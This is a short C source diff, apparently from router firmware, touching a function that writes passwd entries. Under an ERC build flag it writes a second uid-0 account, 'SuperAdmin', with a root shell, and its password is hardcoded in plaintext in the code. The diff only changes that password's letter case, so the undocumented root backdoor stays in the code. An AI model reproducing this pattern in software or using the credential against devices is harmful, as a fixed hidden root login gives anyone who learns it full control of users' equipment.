@@ -118,7 +118,7 @@ void start_mkfiles( void )
     {
 #ifdef HAVE_ERC
     fprintf( fp, "Admin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", http_passwd );
-    fprintf( fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", zencrypt("Se12@rEServiceGate") );
+    fprintf( fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", zencrypt("sE12@rEServiceGate") );
 #else
 	fprintf( fp, "root:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n"
 		 "reboot:%s:0:0:Root User,,,:/tmp/root:/sbin/reboot\n",
